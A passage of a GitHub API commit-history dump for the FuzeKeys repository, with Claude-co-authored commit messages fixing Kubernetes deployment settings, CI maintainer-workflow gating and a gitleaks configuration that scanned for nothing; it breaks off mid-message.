2d76239efd3bb0ba8526cf14c6c3fc118d22d039\nparent 043abdbd1a4ac30eedd1902e0f4c5b257b506e60\nauthor github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com> 1787467180 +0300\ncommitter GitHub <noreply@github.com> 1787467180 +0300\n\nfix(manifest): declare the MCP gateway this repo deploys in prod (#105)\n\n* fix(manifest): declare the MCP gateway this repo deploys in prod\n\n.fuze/manifest.json said mcp.enabled:false with a stdio server at\nmcp/server.py. That file has never existed, and\ndeploy/helm/fuzekeys/values-contabo.yaml - the only valueFile the Argo\nApplication lists - has set mcp.enabled:true since #65 (2026-08-10). The\nfuzekeys-mcp pod is deployed in production and BROKEN\n(CreateContainerConfigError, observed 2026-08-21).\n\nSwitches the block to the gateway dialect (image/spec/overrides/deployment/\nendpoints) and to enabled:true. The credential-vault classification constraint\nfrom the old note is carried over verbatim. No code is touched.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* fix(manifest): state the verified downstream effect, not the assumed one\n\nThe note claimed flipping this flag makes the maintain preflight \"go red for\nwant of LITELLM_FUZE_KEY\". That was repeated, not checked, and it is wrong:\nthe maintain workflow runs on every pull_request, is gated on\nsecrets.ANTHROPIC_API_KEY (not LITELLM_FUZE_KEY), and on a missing key emits a\n::notice:: and SUCCEEDS. Nothing in these repos'' CI reads the enabled flag at\nall - verified by reading the workflows.\n\nWhat the flag actually steers is the maintainer AGENT the workflow runs, whose\nprompt reads this block and is told never to flip enabled:true for a surface\nwith nothing behind it. So the vacuous gate was this manifest, not the\nworkflow - and nothing in CI cross-checks the manifest against the chart, which\nis why the contradiction survived.\n\nAsserting an unverified mechanism is the exact failure this sweep exists to\nremove, so it is corrected here rather than left standing.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n---------\n\nCo-authored-by: Claude <izzy.weinberg@gmail.com>\nCo-authored-by: Claude Opus 5 <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqipWsCRC1aQ7uu5UhlAAACrAQAAlraO1VbZ2n1d+dgb4VXT+Z\n1vBHxr3llQTd92NFwEele2gC0YMDKbNexBGrqpam/HtgLymj386F1YzSJ8MxSphd\nF8n2Zlj9e/p5NNOt7t8bHcLRRJZmna5ciBzOr5n+EixHttHhSVN/8e9sZknosNrL\nQ8K982v9nvpR4KENhVpz6bzEP/PCKPEJrKQ9J+Ion7Q4fTm5lU/cPeMXnuITHKSd\nOd8C/3L636mgCC7a8XtSNFQGLbK+6bIcwnm4e2ww6Kgzi5bvnmoR/umPO2TWegAp\nHhuMxsQVWqQs2weDHT07k4NEYEz6L7DyN1epAU66cWbrdIKUcvQrOI/eirDI5ykV\nzHcXOY4ohN88WV46ehutaGDWowN9RqSPg7vGCsTSj9cUgJoLLDC57y4ASUiABNih\nHUVdybB+UjMrKrCO7Tt2z99+I3BG7Hpqz6keAJcTBs3oKg1ustplucoEvNXT4ydR\nrT/dSR6K/sQfgdHpRs3HSBB1+gyFKcMSVbJ+x7hC6XXwImwOeVOfhB3vb3jgpIK3\nEDe7ptd3xKr/CiJMsSRt4OBQyWINZyuRK1NJAfI5dGxa4AvPkhE9ckvmJ2D9R5QN\nlopwZTvOaeK10Re3CS+hrJhcr2zzJFngcenngOyuPVcnvFLQ8q0pCBKsAOu9ob5Z\n50+0ZecHWYp5yeRzJ5tH\n=dUlY\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-23T06:39:41Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeKeys/commit/833e50b75da637ce2ed197ce048fd917fa9ad5f6","node_id":"C_kwDOO0IuAdoAKDgzM2U1MGI3NWRhNjM3Y2UyZWQxOTdjZTA0OGZkOTE3ZmE5YWQ1ZjY","parents":[{"html_url":"https://github.com/izzywdev/FuzeKeys/commit/043abdbd1a4ac30eedd1902e0f4c5b257b506e60","sha":"043abdbd1a4ac30eedd1902e0f4c5b257b506e60","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/043abdbd1a4ac30eedd1902e0f4c5b257b506e60"}],"sha":"833e50b75da637ce2ed197ce048fd917fa9ad5f6","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/833e50b75da637ce2ed197ce048fd917fa9ad5f6"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/in/1236702?v=4","events_url":"https://api.github.com/users/claude%5Bbot%5D/events{/privacy}","followers_url":"https://api.github.com/users/claude%5Bbot%5D/followers","following_url":"https://api.github.com/users/claude%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/claude%5Bbot%5D/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/apps/claude","id":209825114,"login":"claude[bot]","node_id":"BOT_kgDODIGtWg","organizations_url":"https://api.github.com/users/claude%5Bbot%5D/orgs","received_events_url":"https://api.github.com/users/claude%5Bbot%5D/received_events","repos_url":"https://api.github.com/users/claude%5Bbot%5D/repos","site_admin":false,"starred_url":"https://api.github.com/users/claude%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/claude%5Bbot%5D/subscriptions","type":"Bot","url":"https://api.github.com/users/claude%5Bbot%5D","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/043abdbd1a4ac30eedd1902e0f4c5b257b506e60/comments","commit":{"author":{"date":"2026-08-23T06:39:11Z","email":"209825114+claude[bot]@users.noreply.github.com","name":"claude[bot]"},"comment_count":0,"committer":{"date":"2026-08-23T06:39:11Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(a2a-maintain,mcp-maintain): key the maintainer contract off the manifest, not the key (#104)\n\n.fuze/manifest.json declares a2a.enabled: false and mcp.enabled: false\nhere, yet under the old \"no ANTHROPIC_API_KEY -> skip\" contract both\nworkflows ran to completion on PR #103 (jobs 97145684456 / 97145686422)\nand failed at the claude-code-action step, because this repo has\nANTHROPIC_API_KEY set — the old guard only checked for the key''s\npresence, never the manifest, so a declared-off surface still burned CI\nand reddened the PR. New contract keys off the manifest instead:\n\n  <block>.enabled not declared/false -> skip (no surface, that is the truth)\n  <block>.enabled true, no key        -> FAIL (declared surface, nobody can maintain it)\n  <block>.enabled true, key set       -> run\n\nAlso switches to LITELLM_FUZE_KEY (a LiteLLM virtual key) with an explicit\nANTHROPIC_BASE_URL, adds a ubuntu-latest preflight job to each (this\nrepo''s maintainer job already ran on ubuntu-latest, so that value is\nunchanged), and SHA-pins every `uses:`.\n\nMirrors izzywdev/FuzeSDLC#180 (canonical templates) and the FuzeFront\nin-repo reference (branch claude/fuze-fuzefront-registration-hymmqk).\n\n\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\nCo-authored-by: izzywdev <izzy.weinberg@gmail.com>\nCo-authored-by: Claude Sonnet 5 <noreply@anthropic.com>","tree":{"sha":"9e0ef386878bdea0af3a332dad3a9bc3911bcba3","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/9e0ef386878bdea0af3a332dad3a9bc3911bcba3"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/043abdbd1a4ac30eedd1902e0f4c5b257b506e60","verification":{"payload":"tree 9e0ef386878bdea0af3a332dad3a9bc3911bcba3\nparent 370fb0ef689490f21994f120281a8fe269bd7e25\nauthor claude[bot] <209825114+claude[bot]@users.noreply.github.com> 1787467151 +0300\ncommitter GitHub <noreply@github.com> 1787467151 +0300\n\nfix(a2a-maintain,mcp-maintain): key the maintainer contract off the manifest, not the key (#104)\n\n.fuze/manifest.json declares a2a.enabled: false and mcp.enabled: false\nhere, yet under the old \"no ANTHROPIC_API_KEY -> skip\" contract both\nworkflows ran to completion on PR #103 (jobs 97145684456 / 97145686422)\nand failed at the claude-code-action step, because this repo has\nANTHROPIC_API_KEY set — the old guard only checked for the key''s\npresence, never the manifest, so a declared-off surface still burned CI\nand reddened the PR. New contract keys off the manifest instead:\n\n  <block>.enabled not declared/false -> skip (no surface, that is the truth)\n  <block>.enabled true, no key        -> FAIL (declared surface, nobody can maintain it)\n  <block>.enabled true, key set       -> run\n\nAlso switches to LITELLM_FUZE_KEY (a LiteLLM virtual key) with an explicit\nANTHROPIC_BASE_URL, adds a ubuntu-latest preflight job to each (this\nrepo''s maintainer job already ran on ubuntu-latest, so that value is\nunchanged), and SHA-pins every `uses:`.\n\nMirrors izzywdev/FuzeSDLC#180 (canonical templates) and the FuzeFront\nin-repo reference (branch claude/fuze-fuzefront-registration-hymmqk).\n\n\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\nCo-authored-by: izzywdev <izzy.weinberg@gmail.com>\nCo-authored-by: Claude Sonnet 5 <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqipWPCRC1aQ7uu5UhlAAA5jEQAB/tjbL9n+69kK+ZMIlfRpw5\nHranM3ZvMtNboH1s7sp42kf75mqJZfY4D7wCtMAHEO7MdqKZn+1j5tFCjhX8XVIa\n5vPToz9TR+gKonAArp+QMEKXOrGssQuK4CKUub7iYK1cQNPv1ZcsVPLfnr4MA13X\n63aIjw2NF6+Kw+b77SFvlq1OVXsFniAYJ3sw0DSMIhg478ANWD3Ak1BmhpUyO61+\nvH782GwAiyrWHYAAB8aKOCsGgNIujJ3rVmQ66beu53bygE+BUh15hSH+cs/dD9fS\nLNHsfFS5XbmhWKoaOWWe4sASVww+pdw65LYeZxUSEesDvjn2BajAwtn9IiGwDFFA\n6ti56fkTALIbfnIc35lI9hv8D7eId+VSSHRhlS/PYtem5QFrz9q/9RLqRifMi195\nFMvNJK6Hz7M+jmgCJ9wXsdVa4yVfIZvHSqW2V5RzNBtrOvCb5C2RuSX99coQgrOJ\naHHYc9VM2GYOhki9/PIM61vJVJUplpFb4mPuLo+vUf0+UDztymRVBwAaMqMI10wj\nN3hi9kv45zP4Om4sOZ1e71DaQRvwW+885uTs92NK5avh0gwQt+lY0SRYcgg9bhY8\na5xwGEZEqkfesLjqSUIaYlRg2vGdonD57Yw5W72WhbbmMPQEPcr6LMYUQlo8vzXs\nL+OD9kA+wnkFySyzbA2d\n=1ELl\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-23T06:39:12Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeKeys/commit/043abdbd1a4ac30eedd1902e0f4c5b257b506e60","node_id":"C_kwDOO0IuAdoAKDA0M2FiZGJkMWE0YWMzMGVlZGQxOTAyZTBmNGM1YjI1N2I1MDZlNjA","parents":[{"html_url":"https://github.com/izzywdev/FuzeKeys/commit/370fb0ef689490f21994f120281a8fe269bd7e25","sha":"370fb0ef689490f21994f120281a8fe269bd7e25","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/370fb0ef689490f21994f120281a8fe269bd7e25"}],"sha":"043abdbd1a4ac30eedd1902e0f4c5b257b506e60","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/043abdbd1a4ac30eedd1902e0f4c5b257b506e60"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/in/1236702?v=4","events_url":"https://api.github.com/users/claude%5Bbot%5D/events{/privacy}","followers_url":"https://api.github.com/users/claude%5Bbot%5D/followers","following_url":"https://api.github.com/users/claude%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/claude%5Bbot%5D/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/apps/claude","id":209825114,"login":"claude[bot]","node_id":"BOT_kgDODIGtWg","organizations_url":"https://api.github.com/users/claude%5Bbot%5D/orgs","received_events_url":"https://api.github.com/users/claude%5Bbot%5D/received_events","repos_url":"https://api.github.com/users/claude%5Bbot%5D/repos","site_admin":false,"starred_url":"https://api.github.com/users/claude%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/claude%5Bbot%5D/subscriptions","type":"Bot","url":"https://api.github.com/users/claude%5Bbot%5D","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/370fb0ef689490f21994f120281a8fe269bd7e25/comments","commit":{"author":{"date":"2026-08-23T06:38:01Z","email":"209825114+claude[bot]@users.noreply.github.com","name":"claude[bot]"},"comment_count":0,"committer":{"date":"2026-08-23T06:38:01Z","email":"noreply@github.com","name":"GitHub"},"message":"feat(deploy): route /apps/fuzekeys/ to the frontend Service so the MF remote is reachable (#103)\n\nThe federation build (vite base /apps/fuzekeys/, exposed ./FuzeKeysApp) was\nalready correct, but no Ingress served it — the portal shell''s fetch of\n/apps/fuzekeys/remoteEntry.js 404''d behind a green healthcheck.\n\nAdd a federatedMount Ingress (own object, own namespace) mirroring FuzeX''s\nworking shape (deploy/helm/fuzex/templates/federated-mount-ingress.yaml):\nprefix path routed pass-through (no strip-prefix, since frontend/nginx.conf\nalready serves the MFE build under that exact prefix) to the frontend\nService:80, className traefik, no TLS/cert-manager (Cloudflare-Tunnel-only\ncluster). Disabled + hostless by default in values.yaml (host is `required`\nwhen enabled, so it can never hijack the controller); enabled in\nvalues-contabo.yaml against app.fuzefront.com, FuzeFront''s existing prod\nhost — no new DNS needed.\n\n\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\nCo-authored-by: Claude <izzy.weinberg@gmail.com>\nCo-authored-by: Claude Sonnet 5 <noreply@anthropic.com>","tree":{"sha":"9f5dccb610f44d2bf16eea17f74bc27e400b80af","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/9f5dccb610f44d2bf16eea17f74bc27e400b80af"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/370fb0ef689490f21994f120281a8fe269bd7e25","verification":{"payload":"tree 9f5dccb610f44d2bf16eea17f74bc27e400b80af\nparent 0ce01791806962ea22b1f204fd5747ce74b3015a\nauthor claude[bot] <209825114+claude[bot]@users.noreply.github.com> 1787467081 +0300\ncommitter GitHub <noreply@github.com> 1787467081 +0300\n\nfeat(deploy): route /apps/fuzekeys/ to the frontend Service so the MF remote is reachable (#103)\n\nThe federation build (vite base /apps/fuzekeys/, exposed ./FuzeKeysApp) was\nalready correct, but no Ingress served it — the portal shell''s fetch of\n/apps/fuzekeys/remoteEntry.js 404''d behind a green healthcheck.\n\nAdd a federatedMount Ingress (own object, own namespace) mirroring FuzeX''s\nworking shape (deploy/helm/fuzex/templates/federated-mount-ingress.yaml):\nprefix path routed pass-through (no strip-prefix, since frontend/nginx.conf\nalready serves the MFE build under that exact prefix) to the frontend\nService:80, className traefik, no TLS/cert-manager (Cloudflare-Tunnel-only\ncluster). Disabled + hostless by default in values.yaml (host is `required`\nwhen enabled, so it can never hijack the controller); enabled in\nvalues-contabo.yaml against app.fuzefront.com, FuzeFront''s existing prod\nhost — no new DNS needed.\n\n\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\nCo-authored-by: Claude <izzy.weinberg@gmail.com>\nCo-authored-by: Claude Sonnet 5 <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqipVJCRC1aQ7uu5UhlAAAgNIQAAuCpJyhIVk2cX+PTGnOgd3p\nrtnZEXzptuBMpEKBfBBvpBMLohjMac9V9bsQWhxEBuBehQ1PAoWRovV2CsMjuWwG\ngBaXYBLNTifChnJiRTj1RhCx/Z7yx9j5S1HmNbX3c1NAdcZeTy8qHzDtdGpSrCqv\nGcgqXvVfcgV3fq9zGPYrBul45Ocx3o4B0lI85RbVl36OaCLuS8KqfFy+n2fnsbAs\nwB7nrppIfXutQN0NtUXrIXDK6ahlxzM+m43XYTKNoS4WKmULVAUXMpLT6nrCKnfv\namTl8Q5WrAREUjHj76fGV0fyyuR4meyHyEaYsu5jbJvAQbEJASEst2Rze+xnBChk\nbAF/ilL6r9swI+CKzsnqo2EHB8mQfmOZ3g2y6A+ltnwBhwMLQt44FBv63doBkbf4\nK4Xr/P+c8Xg+rpMCDxWP4h3mxipvqM7HvC83qt9K2BPAn9bOcRch6jp4GhsI6YpI\nRRGBtEwCJWt1OX5ttaZDP2Yvz/EDm8SMtKfheDei0Pu72szT+uc8JVk1HPMta3AN\n00rnTwvJswIWxYZaUvPRoJu4b8gTT/Ren2R89n+kuYQvjWaa5sA0VdZpYT7QUQOa\nVb18OuHQ9o/PKU8d+pf7E6ohuM1SEOAgnrVEy2Lf7bGurQPLsZMa8xNiAP+EGxzB\nww22umCHrJIojgMZ4kLP\n=yw5C\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-23T06:38:02Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeKeys/commit/370fb0ef689490f21994f120281a8fe269bd7e25","node_id":"C_kwDOO0IuAdoAKDM3MGZiMGVmNjg5NDkwZjIxOTk0ZjEyMDI4MWE4ZmUyNjliZDdlMjU","parents":[{"html_url":"https://github.com/izzywdev/FuzeKeys/commit/0ce01791806962ea22b1f204fd5747ce74b3015a","sha":"0ce01791806962ea22b1f204fd5747ce74b3015a","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/0ce01791806962ea22b1f204fd5747ce74b3015a"}],"sha":"370fb0ef689490f21994f120281a8fe269bd7e25","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/370fb0ef689490f21994f120281a8fe269bd7e25"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/u/99821070?v=4","events_url":"https://api.github.com/users/izzywdev/events{/privacy}","followers_url":"https://api.github.com/users/izzywdev/followers","following_url":"https://api.github.com/users/izzywdev/following{/other_user}","gists_url":"https://api.github.com/users/izzywdev/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/izzywdev","id":99821070,"login":"izzywdev","node_id":"U_kgDOBfMmDg","organizations_url":"https://api.github.com/users/izzywdev/orgs","received_events_url":"https://api.github.com/users/izzywdev/received_events","repos_url":"https://api.github.com/users/izzywdev/repos","site_admin":false,"starred_url":"https://api.github.com/users/izzywdev/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/izzywdev/subscriptions","type":"User","url":"https://api.github.com/users/izzywdev","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/0ce01791806962ea22b1f204fd5747ce74b3015a/comments","commit":{"author":{"date":"2026-08-23T02:50:08Z","email":"99821070+izzywdev@users.noreply.github.com","name":"Israel Weinberg"},"comment_count":0,"committer":{"date":"2026-08-23T02:50:08Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(mcp): pin a numeric runAsUser — the gateway has been unschedulable for 10 days (#99)\n\n* fix(mcp): pin a numeric runAsUser — the gateway has been unschedulable for 10 days\n\nThe MCP gateway pod has never started in production. `kubectl describe` names it exactly:\n\n  Error: container has runAsNonRoot and image has non-numeric user (mcp),\n  cannot verify user is non-root          (x12357 over 47h)\n\nghcr.io/izzywdev/fuze-mcp-gateway declares `USER mcp` — a NAME. The kubelet cannot\nresolve a name to a uid without running the image, so with `runAsNonRoot: true` and no\n`runAsUser` it refuses the container at admission. This is not a pull failure and not a\nmissing secret: the image pulled fine 14,836 times over 10 days, every one of them\nfollowed by this refusal.\n\n1000 is not a guess. FuzePicker runs the SAME gateway image (0.1.0) in production with\nrunAsUser 1000 and its pod is Running 1/1 — that is where the value comes from.\n\nDeliberately NOT fixed by dropping runAsNonRoot. FuzeSales survives that way, and it is\na weaker posture, not a fix.\n\nWhy CI never caught it: this is an ADMISSION-time check. The manifest is schema-valid\nthroughout, so `helm lint` and `kubeconform` both pass on the broken config — the same\ngap that shipped the NetworkPolicy port outage (FuzeInfra#501).\n\nVerified: `helm lint` clean, and `helm template` WITH THE PRODUCTION VALUES OVERLAY\nrenders the mcp Deployment with runAsNonRoot=True, runAsUser=1000. The default values\ngate the gateway off, so rendering without the overlay would have proven nothing.\n\n* chore(governance): reconcile managed files to FuzeSDLC v1 [skip ci]\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>\nCo-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>","tree":{"sha":"98482ab3237d4ad8cc45080d42ec4590e7233310","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/98482ab3237d4ad8cc45080d42ec4590e7233310"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/0ce01791806962ea22b1f204fd5747ce74b3015a","verification":{"payload":"tree 98482ab3237d4ad8cc45080d42ec4590e7233310\nparent affd7af29b3548cb157cf7646b582408b408d02e\nauthor Israel Weinberg <99821070+izzywdev@users.noreply.github.com> 1787453408 +0300\ncommitter GitHub <noreply@github.com> 1787453408 +0300\n\nfix(mcp): pin a numeric runAsUser — the gateway has been unschedulable for 10 days (#99)\n\n* fix(mcp): pin a numeric runAsUser — the gateway has been unschedulable for 10 days\n\nThe MCP gateway pod has never started in production. `kubectl describe` names it exactly:\n\n  Error: container has runAsNonRoot and image has non-numeric user (mcp),\n  cannot verify user is non-root          (x12357 over 47h)\n\nghcr.io/izzywdev/fuze-mcp-gateway declares `USER mcp` — a NAME. The kubelet cannot\nresolve a name to a uid without running the image, so with `runAsNonRoot: true` and no\n`runAsUser` it refuses the container at admission. This is not a pull failure and not a\nmissing secret: the image pulled fine 14,836 times over 10 days, every one of them\nfollowed by this refusal.\n\n1000 is not a guess. FuzePicker runs the SAME gateway image (0.1.0) in production with\nrunAsUser 1000 and its pod is Running 1/1 — that is where the value comes from.\n\nDeliberately NOT fixed by dropping runAsNonRoot. FuzeSales survives that way, and it is\na weaker posture, not a fix.\n\nWhy CI never caught it: this is an ADMISSION-time check. The manifest is schema-valid\nthroughout, so `helm lint` and `kubeconform` both pass on the broken config — the same\ngap that shipped the NetworkPolicy port outage (FuzeInfra#501).\n\nVerified: `helm lint` clean, and `helm template` WITH THE PRODUCTION VALUES OVERLAY\nrenders the mcp Deployment with runAsNonRoot=True, runAsUser=1000. The default values\ngate the gateway off, so rendering without the overlay would have proven nothing.\n\n* chore(governance): reconcile managed files to FuzeSDLC v1 [skip ci]\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>\nCo-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqil/gCRC1aQ7uu5UhlAAAVdYQABD9FCTKjZKPcrB1ES6ZItr7\nJMtG0nyMYeYLsJ4ts5b7/Sd11AgxW2sEXTxuLiFOwCAvdgiO/5gFNlmOJkHv4/uo\nyEMbUz7P+tRH8Nx+BVVGfgpFL0wbaf08ihFMCfAoBSHia3begBiLFLX42gLCOJvx\nqoITF1KWjSGEcIoSfFGNsfd51QnIGC6ZE5UyuvHQsr1OjpONrpgLfDXsSqCrtA02\nXMOiOpS9dioC6wPQavezCulEXU23/kDLAdhyLss4RtXvZ/sSE7cdOfXqVBCx0qTJ\nVTMOLSDUIN5ZJacGNrZBq2XH8eaNQqyYAKsq7gWla9qEQTZvybfAT5txAfZC3Vi2\n7u8/AIVY2KCKQIS67Z6M2NUW1abjLCbocrjTUkbAB36xryjiTpp74D4miEZicwcl\n54l9MzfwbVBpqefg6Em0sJ7yebK95q6tl4O1WoC028A/uRq1BVhP7IB2BZFsT4lJ\nQAj8nBmykXYFac4OnE2hGn8W/hFzBebsV/azvX7ABtqy7piDdkecJHm2TnCAvbFE\nUvMD3mVegntAGOMXOwp0P0eBpBQGY1m9ID4UrmXnEIOiKUJImCLRjGN6l0o5q8TW\nYA8ZkAGPpFqepV9YaW7NxMMdi9DHMjJ6NNCCVmjkzujl+II63QQ3479CJ83IyjD3\n7GxvHJUIOqPER7wa2fw2\n=Wjyc\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-23T02:50:09Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeKeys/commit/0ce01791806962ea22b1f204fd5747ce74b3015a","node_id":"C_kwDOO0IuAdoAKDBjZTAxNzkxODA2OTYyZWEyMmIxZjIwNGZkNTc0N2NlNzRiMzAxNWE","parents":[{"html_url":"https://github.com/izzywdev/FuzeKeys/commit/affd7af29b3548cb157cf7646b582408b408d02e","sha":"affd7af29b3548cb157cf7646b582408b408d02e","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/affd7af29b3548cb157cf7646b582408b408d02e"}],"sha":"0ce01791806962ea22b1f204fd5747ce74b3015a","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/0ce01791806962ea22b1f204fd5747ce74b3015a"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/u/99821070?v=4","events_url":"https://api.github.com/users/izzywdev/events{/privacy}","followers_url":"https://api.github.com/users/izzywdev/followers","following_url":"https://api.github.com/users/izzywdev/following{/other_user}","gists_url":"https://api.github.com/users/izzywdev/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/izzywdev","id":99821070,"login":"izzywdev","node_id":"U_kgDOBfMmDg","organizations_url":"https://api.github.com/users/izzywdev/orgs","received_events_url":"https://api.github.com/users/izzywdev/received_events","repos_url":"https://api.github.com/users/izzywdev/repos","site_admin":false,"starred_url":"https://api.github.com/users/izzywdev/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/izzywdev/subscriptions","type":"User","url":"https://api.github.com/users/izzywdev","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/affd7af29b3548cb157cf7646b582408b408d02e/comments","commit":{"author":{"date":"2026-08-23T02:25:15Z","email":"99821070+izzywdev@users.noreply.github.com","name":"Israel Weinberg"},"comment_count":0,"committer":{"date":"2026-08-23T02:25:15Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(gate-secret-scan): restore the default ruleset — this gate was scanning for nothing (#101)\n\n* fix(gate-secret-scan): restore the default ruleset — this gate was scanning for nothing\n\n.gitleaks.toml declared an allowlist but no [[rules]] and no\n`[extend] useDefault = true`. In gitleaks v8 that loads ZERO rules, so\ngate-secret-scan has been reporting \"no leaks found\" for the life of the\nfile regardless of what the tree contains.\n\nMeasured, not inferred. Same throwaway repo holding a planted AWS access\nkey, gitleaks 8.24.3:\n\n  config as committed      -> \"no leaks found\"\n  config with [extend]     -> \"leaks found: 1\"\n\nThe gate could not have caught a secret in this repo. It was green\nbecause it was looking for nothing.\n\nThis is fleet-wide: 9 of the 12 repos carrying a .gitleaks.toml are in\nthe same state. Each config was written in good faith to NARROW the\ndefault rules for sealed-secret ciphertext or a known false positive,\nand silently disabled all of them instead. That is the whole failure\nmode — 